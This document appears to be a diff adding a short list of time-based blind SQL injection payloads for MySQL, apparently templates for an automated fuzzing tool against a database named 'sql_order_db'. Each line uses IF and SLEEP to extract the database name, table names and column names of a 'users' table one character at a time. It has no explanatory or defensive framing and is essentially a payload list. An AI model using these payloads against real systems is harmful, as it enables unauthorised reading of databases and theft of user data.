@@ -1,0 +1,17 @@
+' OR IF(ASCII(SUBSTRING(DATABASE(), 1, 1))=§116§, SLEEP(10), 0) #
+' OR IF(ORD(SUBSTRING((SELECT table_name,1 FROM information_schema.tables WHERE table_schema='sql_order_db' LIMIT 0,1),1,1))=115, SLEEP(5), 0) #
+' OR IF(ORD(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='sql_order_db' AND table_name='users' LIMIT 0,1),1,1))=115, SLEEP(5), 0) #
+' OR IF(ORD(SUBSTRING((SELECT ... FROM sql_order_db.[...] LIMIT 1,1),1,1))=110, SLEEP(5), 0) #
+
+
+
+
+
+
+
+
+
+
+
+
+
